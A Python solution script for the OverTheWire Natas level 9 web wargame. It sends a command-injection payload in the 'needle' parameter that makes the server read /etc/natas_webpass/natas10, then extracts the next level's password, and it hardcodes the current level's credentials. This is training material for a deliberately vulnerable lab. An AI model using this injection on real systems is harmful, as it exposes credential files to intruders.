import requests, re
USER = 'natas9'
PASS = 'ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t'
URL = f'http://{USER}.natas.labs.overthewire.org/'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
burp = {"http": "http://127.0.0.1:8080"}

payload = '?needle=a+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Search'
url = URL + payload

def myflag():
    request = requests.get(url=url, auth=auth_basic)
    response_http = request.text
    flag_regex = re.findall('([0-9a-zA-Z]{32})', response_http)
    return flag_regex[0 if len(flag_regex) == 1 else 1]
print("The pass for the next level is:", myflag())